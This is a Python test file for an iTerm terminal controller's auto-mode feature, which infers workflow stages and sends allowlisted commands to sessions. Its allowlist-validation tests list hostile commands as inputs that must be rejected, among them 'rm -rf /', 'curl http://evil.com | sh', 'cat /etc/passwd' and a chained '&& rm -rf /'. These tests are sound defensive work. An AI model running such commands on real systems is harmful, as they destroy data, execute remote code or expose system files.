"""Tests for workflow stage automation."""

import tempfile
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from iterm_controller.auto_mode import (
    AutoAdvanceHandler,
    AutoModeController,
    AutoModeIntegration,
    CommandExecutionResult,
    StageTransition,
    WorkflowStageInferrer,
    create_controller_for_project,
    validate_command,
)
from iterm_controller.exceptions import CommandNotAllowedError
from iterm_controller.models import (
    AutoModeConfig,
    GitHubStatus,
    Phase,
    Plan,
    PullRequest,
    Task,
    TaskStatus,
    WorkflowMode,
    WorkflowStage,
)


class TestWorkflowStageInferrer:
    """Tests for WorkflowStageInferrer class."""

    def test_check_prd_exists_when_file_exists(self, tmp_path):
        """Test that check_prd_exists returns True when PRD.md exists."""
        prd_path = tmp_path / "PRD.md"
        prd_path.write_text("# Product Requirements")

        inferrer = WorkflowStageInferrer(tmp_path)
        assert inferrer.check_prd_exists() is True

    def test_check_prd_exists_when_file_missing(self, tmp_path):
        """Test that check_prd_exists returns False when PRD.md missing."""
        inferrer = WorkflowStageInferrer(tmp_path)
        assert inferrer.check_prd_exists() is False

    def test_infer_stage_planning_no_tasks(self, tmp_path):
        """Test inferring PLANNING stage when no tasks exist."""
        inferrer = WorkflowStageInferrer(tmp_path)
        plan = Plan(phases=[])

        state = inferrer.infer_stage(plan, None)
        assert state.stage == WorkflowStage.PLANNING

    def test_infer_stage_execute_with_tasks(self, tmp_path):
        """Test inferring EXECUTE stage when tasks exist."""
        inferrer = WorkflowStageInferrer(tmp_path)
        plan = Plan(
            phases=[
                Phase(
                    id="1",
                    title="Phase 1",
                    tasks=[Task(id="1.1", title="Task 1", status=TaskStatus.PENDING)],
                )
            ]
        )

        state = inferrer.infer_stage(plan, None)
        assert state.stage == WorkflowStage.EXECUTE

    def test_infer_stage_review_when_all_done(self, tmp_path):
        """Test inferring REVIEW stage when all tasks complete."""
        inferrer = WorkflowStageInferrer(tmp_path)
        plan = Plan(
            phases=[
                Phase(
                    id="1",
                    title="Phase 1",
                    tasks=[Task(id="1.1", title="Task 1", status=TaskStatus.COMPLETE)],
                )
            ]
        )

        state = inferrer.infer_stage(plan, None)
        assert state.stage == WorkflowStage.REVIEW

    def test_infer_stage_prd_exists_sets_flag(self, tmp_path):
        """Test that prd_exists flag is set when file exists."""
        prd_path = tmp_path / "PRD.md"
        prd_path.write_text("# Product Requirements")

        inferrer = WorkflowStageInferrer(tmp_path)
        plan = Plan(phases=[])

        state = inferrer.infer_stage(plan, None)
        assert state.prd_exists is True

    def test_infer_stage_prd_unneeded_sets_flag(self, tmp_path):
        """Test that prd_unneeded flag is passed through."""
        inferrer = WorkflowStageInferrer(tmp_path)
        plan = Plan(phases=[])

        state = inferrer.infer_stage(plan, None, prd_unneeded=True)
        assert state.prd_unneeded is True

    def test_infer_stage_pr_with_github_status(self, tmp_path):
        """Test inferring PR stage when PR exists."""
        inferrer = WorkflowStageInferrer(tmp_path)
        plan = Plan(phases=[])
        github_status = GitHubStatus(
            pr=PullRequest(
                number=42,
                title="Feature PR",
                url="https://github.com/test/repo/pull/42",
                state="open",
                merged=False,
            )
        )

        state = inferrer.infer_stage(plan, github_status)
        assert state.stage == WorkflowStage.PR
        assert state.pr_url == "https://github.com/test/repo/pull/42"

    def test_infer_stage_done_when_pr_merged(self, tmp_path):
        """Test inferring DONE stage when PR is merged."""
        inferrer = WorkflowStageInferrer(tmp_path)
        plan = Plan(phases=[])
        github_status = GitHubStatus(
            pr=PullRequest(
                number=42,
                title="Feature PR",
                url="https://github.com/test/repo/pull/42",
                state="closed",
                merged=True,
            )
        )

        state = inferrer.infer_stage(plan, github_status)
        assert state.stage == WorkflowStage.DONE
        assert state.pr_merged is True


class TestAutoModeController:
    """Tests for AutoModeController class."""

    def test_controller_init(self, tmp_path):
        """Test controller initialization."""
        config = AutoModeConfig(enabled=True)
        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )

        assert controller.project_id == "test-project"
        assert controller.config.enabled is True
        assert controller.current_stage is None
        assert controller.current_state is None

    def test_set_prd_unneeded(self, tmp_path):
        """Test setting PRD as unneeded."""
        config = AutoModeConfig()
        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )

        controller.set_prd_unneeded(True)
        assert controller._prd_unneeded is True

    def test_evaluate_stage_sync_updates_state(self, tmp_path):
        """Test synchronous stage evaluation updates internal state."""
        config = AutoModeConfig()
        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )

        plan = Plan(
            phases=[
                Phase(
                    id="1",
                    title="Phase 1",
                    tasks=[Task(id="1.1", title="Task 1", status=TaskStatus.PENDING)],
                )
            ]
        )

        state = controller.evaluate_stage_sync(plan)
        assert state.stage == WorkflowStage.EXECUTE
        assert controller.current_stage == WorkflowStage.EXECUTE
        assert controller.current_state is not None

    def test_evaluate_stage_sync_triggers_callback_on_change(self, tmp_path):
        """Test that stage change callback is triggered on transition."""
        config = AutoModeConfig()
        transitions = []

        def on_change(transition: StageTransition) -> None:
            transitions.append(transition)

        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
            on_stage_change=on_change,
        )

        plan = Plan(
            phases=[
                Phase(
                    id="1",
                    title="Phase 1",
                    tasks=[Task(id="1.1", title="Task 1", status=TaskStatus.PENDING)],
                )
            ]
        )

        controller.evaluate_stage_sync(plan)

        assert len(transitions) == 1
        assert transitions[0].old_stage is None
        assert transitions[0].new_stage == WorkflowStage.EXECUTE
        assert transitions[0].project_id == "test-project"

    def test_evaluate_stage_sync_no_callback_when_same_stage(self, tmp_path):
        """Test that callback is not triggered when stage unchanged."""
        config = AutoModeConfig()
        transitions = []

        def on_change(transition: StageTransition) -> None:
            transitions.append(transition)

        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
            on_stage_change=on_change,
        )

        plan = Plan(
            phases=[
                Phase(
                    id="1",
                    title="Phase 1",
                    tasks=[Task(id="1.1", title="Task 1", status=TaskStatus.PENDING)],
                )
            ]
        )

        # First evaluation triggers callback
        controller.evaluate_stage_sync(plan)
        assert len(transitions) == 1

        # Second evaluation with same plan should not trigger
        controller.evaluate_stage_sync(plan)
        assert len(transitions) == 1

    def test_evaluate_stage_sync_detects_progression(self, tmp_path):
        """Test detection of stage progression."""
        config = AutoModeConfig()
        transitions = []

        def on_change(transition: StageTransition) -> None:
            transitions.append(transition)

        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
            on_stage_change=on_change,
        )

        # First: Execute stage
        plan1 = Plan(
            phases=[
                Phase(
                    id="1",
                    title="Phase 1",
                    tasks=[Task(id="1.1", title="Task 1", status=TaskStatus.PENDING)],
                )
            ]
        )
        controller.evaluate_stage_sync(plan1)

        # Second: Review stage (all tasks complete)
        plan2 = Plan(
            phases=[
                Phase(
                    id="1",
                    title="Phase 1",
                    tasks=[Task(id="1.1", title="Task 1", status=TaskStatus.COMPLETE)],
                )
            ]
        )
        controller.evaluate_stage_sync(plan2)

        assert len(transitions) == 2
        assert transitions[0].new_stage == WorkflowStage.EXECUTE
        assert transitions[1].old_stage == WorkflowStage.EXECUTE
        assert transitions[1].new_stage == WorkflowStage.REVIEW

    @pytest.mark.asyncio
    async def test_evaluate_stage_fetches_github_status(self, tmp_path):
        """Test async stage evaluation fetches GitHub status."""
        config = AutoModeConfig()
        mock_github = MagicMock()
        mock_github.get_status = AsyncMock(
            return_value=GitHubStatus(
                pr=PullRequest(
                    number=42,
                    title="Feature PR",
                    url="https://github.com/test/repo/pull/42",
                    state="open",
                    merged=False,
                )
            )
        )

        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
            github=mock_github,
        )

        plan = Plan(phases=[])
        state = await controller.evaluate_stage(plan)

        mock_github.get_status.assert_called_once_with(str(tmp_path))
        assert state.stage == WorkflowStage.PR

    @pytest.mark.asyncio
    async def test_evaluate_stage_uses_provided_github_status(self, tmp_path):
        """Test that provided GitHub status is used instead of fetching."""
        config = AutoModeConfig()
        mock_github = MagicMock()
        mock_github.get_status = AsyncMock()

        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
            github=mock_github,
        )

        plan = Plan(phases=[])
        github_status = GitHubStatus(
            pr=PullRequest(
                number=42,
                title="Feature PR",
                url="https://github.com/test/repo/pull/42",
                state="closed",
                merged=True,
            )
        )

        state = await controller.evaluate_stage(plan, github_status)

        mock_github.get_status.assert_not_called()
        assert state.stage == WorkflowStage.DONE

    def test_get_stage_command(self, tmp_path):
        """Test getting stage command from config."""
        config = AutoModeConfig(
            enabled=True,
            stage_commands={
                "planning": "claude /prd",
                "execute": "claude /plan",
                "review": "claude /review",
            },
        )

        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )

        assert controller.get_stage_command(WorkflowStage.PLANNING) == "claude /prd"
        assert controller.get_stage_command(WorkflowStage.EXECUTE) == "claude /plan"
        assert controller.get_stage_command(WorkflowStage.PR) is None

    def test_should_auto_advance(self, tmp_path):
        """Test should_auto_advance check."""
        config = AutoModeConfig(enabled=True, auto_advance=True)
        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )
        assert controller.should_auto_advance() is True

        config2 = AutoModeConfig(enabled=False, auto_advance=True)
        controller2 = AutoModeController(
            config=config2,
            project_id="test-project",
            project_path=tmp_path,
        )
        assert controller2.should_auto_advance() is False

    def test_requires_confirmation(self, tmp_path):
        """Test requires_confirmation check."""
        config = AutoModeConfig(require_confirmation=True)
        controller = AutoModeController(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )
        assert controller.requires_confirmation() is True

        config2 = AutoModeConfig(require_confirmation=False)
        controller2 = AutoModeController(
            config=config2,
            project_id="test-project",
            project_path=tmp_path,
        )
        assert controller2.requires_confirmation() is False


class TestStageTransition:
    """Tests for StageTransition dataclass."""

    def test_stage_transition_creation(self):
        """Test creating a StageTransition."""
        transition = StageTransition(
            old_stage=WorkflowStage.EXECUTE,
            new_stage=WorkflowStage.REVIEW,
            project_id="my-project",
        )

        assert transition.old_stage == WorkflowStage.EXECUTE
        assert transition.new_stage == WorkflowStage.REVIEW
        assert transition.project_id == "my-project"

    def test_stage_transition_with_none_old_stage(self):
        """Test StageTransition with None old stage (initial transition)."""
        transition = StageTransition(
            old_stage=None,
            new_stage=WorkflowStage.PLANNING,
            project_id="my-project",
        )

        assert transition.old_stage is None
        assert transition.new_stage == WorkflowStage.PLANNING


class TestCreateControllerForProject:
    """Tests for create_controller_for_project factory function."""

    def test_create_controller(self, tmp_path):
        """Test factory function creates controller correctly."""
        config = AutoModeConfig(enabled=True)

        controller = create_controller_for_project(
            project_id="test-project",
            project_path=tmp_path,
            config=config,
        )

        assert controller.project_id == "test-project"
        assert controller.project_path == tmp_path
        assert controller.config.enabled is True

    def test_create_controller_with_github(self, tmp_path):
        """Test factory function with GitHub integration."""
        config = AutoModeConfig()
        mock_github = MagicMock()

        controller = create_controller_for_project(
            project_id="test-project",
            project_path=tmp_path,
            config=config,
            github=mock_github,
        )

        assert controller.github is mock_github

    def test_create_controller_with_callback(self, tmp_path):
        """Test factory function with stage change callback."""
        config = AutoModeConfig()
        transitions = []

        def on_change(transition: StageTransition) -> None:
            transitions.append(transition)

        controller = create_controller_for_project(
            project_id="test-project",
            project_path=tmp_path,
            config=config,
            on_stage_change=on_change,
        )

        assert controller.on_stage_change is on_change


class TestCommandExecutionResult:
    """Tests for CommandExecutionResult dataclass."""

    def test_successful_result(self):
        """Test creating a successful execution result."""
        result = CommandExecutionResult(
            success=True,
            command="claude /prd",
            session_id="session-123",
        )
        assert result.success is True
        assert result.command == "claude /prd"
        assert result.session_id == "session-123"
        assert result.error is None

    def test_failed_result(self):
        """Test creating a failed execution result."""
        result = CommandExecutionResult(
            success=False,
            command="claude /prd",
            error="No session available",
        )
        assert result.success is False
        assert result.error == "No session available"


class TestAutoAdvanceHandler:
    """Tests for AutoAdvanceHandler class."""

    def test_handler_init(self):
        """Test handler initialization."""
        config = AutoModeConfig(enabled=True)
        handler = AutoAdvanceHandler(config=config)

        assert handler.config.enabled is True
        assert handler.iterm is None
        assert handler.app is None

    @pytest.mark.asyncio
    async def test_handle_stage_change_disabled(self):
        """Test that handler does nothing when auto mode is disabled."""
        config = AutoModeConfig(enabled=False)
        handler = AutoAdvanceHandler(config=config)

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)
        assert result is None

    @pytest.mark.asyncio
    async def test_handle_stage_change_no_auto_advance(self):
        """Test that handler does nothing when auto_advance is False."""
        config = AutoModeConfig(enabled=True, auto_advance=False)
        handler = AutoAdvanceHandler(config=config)

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)
        assert result is None

    @pytest.mark.asyncio
    async def test_handle_stage_change_no_command(self):
        """Test that handler does nothing when no command configured."""
        config = AutoModeConfig(
            enabled=True,
            auto_advance=True,
            stage_commands={},  # No commands
        )
        handler = AutoAdvanceHandler(config=config)

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)
        assert result is None

    @pytest.mark.asyncio
    async def test_handle_stage_change_no_iterm(self):
        """Test that handler returns error when iTerm not available."""
        config = AutoModeConfig(
            enabled=True,
            auto_advance=True,
            require_confirmation=False,
            stage_commands={"execute": "claude /plan"},
        )
        handler = AutoAdvanceHandler(config=config, iterm=None)

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)
        assert result is not None
        assert result.success is False
        assert "not connected" in result.error.lower()

    @pytest.mark.asyncio
    async def test_handle_stage_change_executes_command(self):
        """Test that handler executes command when properly configured."""
        config = AutoModeConfig(
            enabled=True,
            auto_advance=True,
            require_confirmation=False,
            stage_commands={"execute": "claude /plan"},
        )

        # Mock iTerm controller and session
        mock_session = MagicMock()
        mock_session.session_id = "session-123"
        mock_session.async_send_text = AsyncMock()

        mock_tab = MagicMock()
        mock_tab.current_session = mock_session

        mock_window = MagicMock()
        mock_window.current_tab = mock_tab

        mock_app = MagicMock()
        mock_app.current_terminal_window = mock_window

        mock_iterm = MagicMock()
        mock_iterm.is_connected = True
        mock_iterm.app = mock_app

        handler = AutoAdvanceHandler(config=config, iterm=mock_iterm)

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)

        assert result is not None
        assert result.success is True
        assert result.command == "claude /plan"
        assert result.session_id == "session-123"
        mock_session.async_send_text.assert_called_once_with("claude /plan\n")

    @pytest.mark.asyncio
    async def test_handle_stage_change_uses_designated_session(self):
        """Test that handler uses designated session when configured."""
        config = AutoModeConfig(
            enabled=True,
            auto_advance=True,
            require_confirmation=False,
            stage_commands={"execute": "claude /plan"},
            designated_session="designated-session-id",
        )

        # Mock designated session
        mock_session = MagicMock()
        mock_session.session_id = "designated-session-id"
        mock_session.async_send_text = AsyncMock()

        mock_app = MagicMock()
        mock_app.get_session_by_id = MagicMock(return_value=mock_session)
        mock_app.current_terminal_window = None  # Should not be used

        mock_iterm = MagicMock()
        mock_iterm.is_connected = True
        mock_iterm.app = mock_app

        handler = AutoAdvanceHandler(config=config, iterm=mock_iterm)

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)

        assert result.success is True
        assert result.session_id == "designated-session-id"
        mock_app.get_session_by_id.assert_called_once_with(
            "designated-session-id"
        )

    @pytest.mark.asyncio
    async def test_handle_stage_change_confirmation_declined(self):
        """Test that handler respects declined confirmation."""
        config = AutoModeConfig(
            enabled=True,
            auto_advance=True,
            require_confirmation=True,
            stage_commands={"execute": "claude /plan"},
        )

        mock_app = MagicMock()
        handler = AutoAdvanceHandler(config=config, app=mock_app)

        # Mock the _show_confirmation_modal method to return False
        async def mock_show_modal(stage, command):
            return False

        handler._show_confirmation_modal = mock_show_modal

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)

        assert result is not None
        assert result.success is False
        assert "declined" in result.error.lower()

    @pytest.mark.asyncio
    async def test_handle_stage_change_confirmation_accepted(self):
        """Test that handler proceeds when confirmation accepted."""
        config = AutoModeConfig(
            enabled=True,
            auto_advance=True,
            require_confirmation=True,
            stage_commands={"execute": "claude /plan"},
        )

        # Mock session
        mock_session = MagicMock()
        mock_session.session_id = "session-123"
        mock_session.async_send_text = AsyncMock()

        mock_tab = MagicMock()
        mock_tab.current_session = mock_session

        mock_window = MagicMock()
        mock_window.current_tab = mock_tab

        mock_iterm_app = MagicMock()
        mock_iterm_app.current_terminal_window = mock_window

        mock_iterm = MagicMock()
        mock_iterm.is_connected = True
        mock_iterm.app = mock_iterm_app

        mock_app = MagicMock()
        handler = AutoAdvanceHandler(config=config, iterm=mock_iterm, app=mock_app)

        # Mock the _show_confirmation_modal method to return True
        async def mock_show_modal(stage, command):
            return True

        handler._show_confirmation_modal = mock_show_modal

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)

        assert result.success is True
        mock_session.async_send_text.assert_called_once()

    def test_create_transition_handler(self):
        """Test create_transition_handler returns correct callable."""
        config = AutoModeConfig(enabled=True)
        handler = AutoAdvanceHandler(config=config)

        transition_handler = handler.create_transition_handler()

        # Should be the same as handle_stage_change
        assert transition_handler == handler.handle_stage_change

    @pytest.mark.asyncio
    async def test_handle_mode_enter_disabled(self):
        """Test that mode enter does nothing when auto mode is disabled."""
        config = AutoModeConfig(enabled=False)
        handler = AutoAdvanceHandler(config=config)

        result = await handler.handle_mode_enter(WorkflowMode.PLAN)
        assert result is None

    @pytest.mark.asyncio
    async def test_handle_mode_enter_no_command(self):
        """Test that mode enter does nothing when no command configured."""
        config = AutoModeConfig(
            enabled=True,
            mode_commands={},  # No mode commands
        )
        handler = AutoAdvanceHandler(config=config)

        result = await handler.handle_mode_enter(WorkflowMode.PLAN)
        assert result is None

    @pytest.mark.asyncio
    async def test_handle_mode_enter_no_iterm(self):
        """Test that mode enter returns error when iTerm not available."""
        config = AutoModeConfig(
            enabled=True,
            require_confirmation=False,
            mode_commands={"plan": "claude /prd"},
        )
        handler = AutoAdvanceHandler(config=config, iterm=None)

        result = await handler.handle_mode_enter(WorkflowMode.PLAN)
        assert result is not None
        assert result.success is False
        assert "not connected" in result.error.lower()

    @pytest.mark.asyncio
    async def test_handle_mode_enter_executes_command(self):
        """Test that mode enter executes command when properly configured."""
        config = AutoModeConfig(
            enabled=True,
            require_confirmation=False,
            mode_commands={"plan": "claude /prd"},
        )

        # Mock iTerm controller and session
        mock_session = MagicMock()
        mock_session.session_id = "session-123"
        mock_session.async_send_text = AsyncMock()

        mock_tab = MagicMock()
        mock_tab.current_session = mock_session

        mock_window = MagicMock()
        mock_window.current_tab = mock_tab

        mock_app = MagicMock()
        mock_app.current_terminal_window = mock_window

        mock_iterm = MagicMock()
        mock_iterm.is_connected = True
        mock_iterm.app = mock_app

        handler = AutoAdvanceHandler(config=config, iterm=mock_iterm)

        result = await handler.handle_mode_enter(WorkflowMode.PLAN)

        assert result is not None
        assert result.success is True
        assert result.command == "claude /prd"
        assert result.session_id == "session-123"
        mock_session.async_send_text.assert_called_once_with("claude /prd\n")

    @pytest.mark.asyncio
    async def test_handle_mode_enter_confirmation_declined(self):
        """Test that mode enter respects declined confirmation."""
        config = AutoModeConfig(
            enabled=True,
            require_confirmation=True,
            mode_commands={"plan": "claude /prd"},
        )

        # Mock app that returns False from modal
        mock_app = MagicMock()

        handler = AutoAdvanceHandler(config=config, app=mock_app)

        # Mock the _show_mode_command_modal method to return False
        async def mock_show_modal(mode, command):
            return False

        handler._show_mode_command_modal = mock_show_modal

        result = await handler.handle_mode_enter(WorkflowMode.PLAN)

        assert result is not None
        assert result.success is False
        assert "declined" in result.error.lower()

    @pytest.mark.asyncio
    async def test_handle_mode_enter_different_modes(self):
        """Test mode commands for different workflow modes."""
        config = AutoModeConfig(
            enabled=True,
            require_confirmation=False,
            mode_commands={
                "plan": "claude /prd",
                "work": "claude /plan",
                "test": "claude /qa",
            },
        )

        # Mock iTerm controller and session
        mock_session = MagicMock()
        mock_session.session_id = "session-123"
        mock_session.async_send_text = AsyncMock()

        mock_tab = MagicMock()
        mock_tab.current_session = mock_session

        mock_window = MagicMock()
        mock_window.current_tab = mock_tab

        mock_app = MagicMock()
        mock_app.current_terminal_window = mock_window

        mock_iterm = MagicMock()
        mock_iterm.is_connected = True
        mock_iterm.app = mock_app

        handler = AutoAdvanceHandler(config=config, iterm=mock_iterm)

        # Test PLAN mode
        result = await handler.handle_mode_enter(WorkflowMode.PLAN)
        assert result.command == "claude /prd"

        # Test WORK mode
        mock_session.async_send_text.reset_mock()
        result = await handler.handle_mode_enter(WorkflowMode.WORK)
        assert result.command == "claude /plan"

        # Test TEST mode
        mock_session.async_send_text.reset_mock()
        result = await handler.handle_mode_enter(WorkflowMode.TEST)
        assert result.command == "claude /qa"

        # Test DOCS mode (no command configured)
        mock_session.async_send_text.reset_mock()
        result = await handler.handle_mode_enter(WorkflowMode.DOCS)
        assert result is None


class TestAutoModeIntegration:
    """Tests for AutoModeIntegration class."""

    def test_integration_init(self, tmp_path):
        """Test integration initialization."""
        config = AutoModeConfig(enabled=True)
        integration = AutoModeIntegration(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )

        assert integration.config.enabled is True
        assert integration.current_stage is None
        assert integration.current_state is None
        assert integration.last_execution_result is None

    @pytest.mark.asyncio
    async def test_on_plan_change_evaluates_stage(self, tmp_path):
        """Test that on_plan_change evaluates the new stage."""
        config = AutoModeConfig(enabled=False)  # Disable auto advance
        integration = AutoModeIntegration(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )

        plan = Plan(
            phases=[
                Phase(
                    id="1",
                    title="Phase 1",
                    tasks=[Task(id="1.1", title="Task 1", status=TaskStatus.PENDING)],
                )
            ]
        )

        state = await integration.on_plan_change(plan)

        assert state.stage == WorkflowStage.EXECUTE
        assert integration.current_stage == WorkflowStage.EXECUTE

    @pytest.mark.asyncio
    async def test_on_plan_change_executes_command_on_transition(self, tmp_path):
        """Test that on_plan_change executes command on stage transition."""
        config = AutoModeConfig(
            enabled=True,
            auto_advance=True,
            require_confirmation=False,
            stage_commands={"review": "claude /review"},
        )

        # Mock session
        mock_session = MagicMock()
        mock_session.session_id = "session-123"
        mock_session.async_send_text = AsyncMock()

        mock_tab = MagicMock()
        mock_tab.current_session = mock_session

        mock_window = MagicMock()
        mock_window.current_tab = mock_tab

        mock_iterm_app = MagicMock()
        mock_iterm_app.current_terminal_window = mock_window

        mock_iterm = MagicMock()
        mock_iterm.is_connected = True
        mock_iterm.app = mock_iterm_app

        integration = AutoModeIntegration(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
            iterm=mock_iterm,
        )

        # First: Set up execute stage
        plan1 = Plan(
            phases=[
                Phase(
                    id="1",
                    title="Phase 1",
                    tasks=[Task(id="1.1", title="Task 1", status=TaskStatus.PENDING)],
                )
            ]
        )
        await integration.on_plan_change(plan1)

        # Then: Transition to review stage (all tasks complete)
        plan2 = Plan(
            phases=[
                Phase(
                    id="1",
                    title="Phase 1",
                    tasks=[Task(id="1.1", title="Task 1", status=TaskStatus.COMPLETE)],
                )
            ]
        )
        state = await integration.on_plan_change(plan2)

        assert state.stage == WorkflowStage.REVIEW
        assert integration.last_execution_result is not None
        assert integration.last_execution_result.success is True
        assert integration.last_execution_result.command == "claude /review"
        mock_session.async_send_text.assert_called_with("claude /review\n")

    def test_set_prd_unneeded(self, tmp_path):
        """Test setting PRD as unneeded."""
        config = AutoModeConfig()
        integration = AutoModeIntegration(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )

        integration.set_prd_unneeded(True)
        assert integration.controller._prd_unneeded is True

    def test_update_iterm(self, tmp_path):
        """Test updating iTerm controller reference."""
        config = AutoModeConfig()
        integration = AutoModeIntegration(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )

        mock_iterm = MagicMock()
        integration.update_iterm(mock_iterm)

        assert integration.handler.iterm is mock_iterm

    def test_update_app(self, tmp_path):
        """Test updating Textual app reference."""
        config = AutoModeConfig()
        integration = AutoModeIntegration(
            config=config,
            project_id="test-project",
            project_path=tmp_path,
        )

        mock_app = MagicMock()
        integration.update_app(mock_app)

        assert integration.handler.app is mock_app


class TestValidateCommand:
    """Tests for validate_command function."""

    def test_validate_command_matches_exact_pattern(self):
        """Test that exact pattern matches work."""
        allowed = [r"^claude\s+/prd$"]
        assert validate_command("claude /prd", allowed) is True

    def test_validate_command_rejects_non_matching(self):
        """Test that non-matching commands are rejected."""
        allowed = [r"^claude\s+/prd$"]
        assert validate_command("rm -rf /", allowed) is False

    def test_validate_command_matches_one_of_multiple(self):
        """Test that command can match any of multiple patterns."""
        allowed = [
            r"^claude\s+/prd$",
            r"^claude\s+/plan$",
            r"^claude\s+/review$",
        ]
        assert validate_command("claude /prd", allowed) is True
        assert validate_command("claude /plan", allowed) is True
        assert validate_command("claude /review", allowed) is True
        assert validate_command("claude /hack", allowed) is False

    def test_validate_command_empty_allowlist_rejects_all(self):
        """Test that empty allowlist rejects all commands."""
        assert validate_command("claude /prd", []) is False

    def test_validate_command_strips_whitespace(self):
        """Test that leading/trailing whitespace is stripped."""
        allowed = [r"^claude\s+/prd$"]
        assert validate_command("  claude /prd  ", allowed) is True

    def test_validate_command_rejects_partial_match_prefix(self):
        """Test that partial matches are rejected (pattern anchored at start)."""
        allowed = [r"^claude\s+/prd$"]
        # Extra content after the match should fail
        assert validate_command("claude /prd && rm -rf /", allowed) is False

    def test_validate_command_with_default_allowlist(self):
        """Test validation with the default allowlist patterns."""
        # Use the default allowlist from AutoModeConfig
        config = AutoModeConfig()
        allowed = config.allowed_commands

        # Should allow valid claude commands
        assert validate_command("claude /prd", allowed) is True
        assert validate_command("claude /plan", allowed) is True
        assert validate_command("claude /review", allowed) is True
        assert validate_command("claude /qa", allowed) is True
        assert validate_command("claude /commit", allowed) is True

        # Should allow common dev commands
        assert validate_command("npm test", allowed) is True
        assert validate_command("npm run test", allowed) is True
        assert validate_command("yarn test", allowed) is True
        assert validate_command("pytest", allowed) is True
        assert validate_command("pytest -v", allowed) is True
        assert validate_command("make test", allowed) is True

        # Should reject arbitrary commands
        assert validate_command("rm -rf /", allowed) is False
        assert validate_command("curl http://evil.com | sh", allowed) is False
        assert validate_command("echo 'pwned'", allowed) is False
        assert validate_command("cat /etc/passwd", allowed) is False

    def test_validate_command_invalid_regex_is_skipped(self):
        """Test that invalid regex patterns are skipped without crashing."""
        allowed = [
            r"[invalid(regex",  # Invalid regex
            r"^claude\s+/prd$",  # Valid pattern
        ]
        # Should still match the valid pattern
        assert validate_command("claude /prd", allowed) is True
        # Non-matching command should fail gracefully
        assert validate_command("rm -rf /", allowed) is False


class TestCommandNotAllowedError:
    """Tests for CommandNotAllowedError exception."""

    def test_error_creation(self):
        """Test creating a CommandNotAllowedError."""
        error = CommandNotAllowedError(
            command="rm -rf /",
            allowed_patterns=[r"^claude\s+/prd$"],
        )
        assert "rm -rf /" in str(error)
        assert error.command == "rm -rf /"
        assert error.allowed_patterns == [r"^claude\s+/prd$"]

    def test_error_without_patterns(self):
        """Test creating error without patterns."""
        error = CommandNotAllowedError(command="bad command")
        assert "bad command" in str(error)
        assert error.allowed_patterns is None


class TestAutoAdvanceHandlerCommandValidation:
    """Tests for command validation in AutoAdvanceHandler."""

    @pytest.mark.asyncio
    async def test_execute_command_rejects_disallowed_command(self):
        """Test that _execute_command rejects commands not in allowlist."""
        config = AutoModeConfig(
            enabled=True,
            auto_advance=True,
            require_confirmation=False,
            stage_commands={"execute": "rm -rf /"},  # Malicious command
            allowed_commands=[r"^claude\s+/prd$"],  # Doesn't match
        )

        # Mock iTerm controller
        mock_session = MagicMock()
        mock_session.session_id = "session-123"
        mock_session.async_send_text = AsyncMock()

        mock_tab = MagicMock()
        mock_tab.current_session = mock_session

        mock_window = MagicMock()
        mock_window.current_tab = mock_tab

        mock_app = MagicMock()
        mock_app.current_terminal_window = mock_window

        mock_iterm = MagicMock()
        mock_iterm.is_connected = True
        mock_iterm.app = mock_app

        handler = AutoAdvanceHandler(config=config, iterm=mock_iterm)

        transition = StageTransition(
            old_stage=WorkflowStage.PLANNING,
            new_stage=WorkflowStage.EXECUTE,
            project_id="test-project",
        )

        result = await handler.handle_stage_change(transition)

        # Command should be rejected
        assert result is not None
        assert result.success is False
        assert "not allowed" in result.error.lower()
        # The malicious command should NOT have been sent
        mock_session.async_send_text.assert_not_called()

    @pytest.mark.asyncio
    async def test_execute_command_allows_valid_command(self):
        """Test that _execute_command allows commands in allowlist."""
        config = AutoModeConfig(
            enabled=True,
            auto_advance=True,
            require_confirmation=False,
            stage_commands={"execute": "claude /plan"},
            # Uses default allowlist which includes claude /plan
        )

        # Mock iTerm controller
        mock_session = MagicMock()
        mock_session.session_id = "session-123"
        mock_session.async_send_text = AsyncMock()

        mock_tab = MagicMock()
        mock_tab.current_session = mock_session

        mock_window = MagicMock()
        mock_window.current_tab = mock_tab

        mock_app = MagicMock()
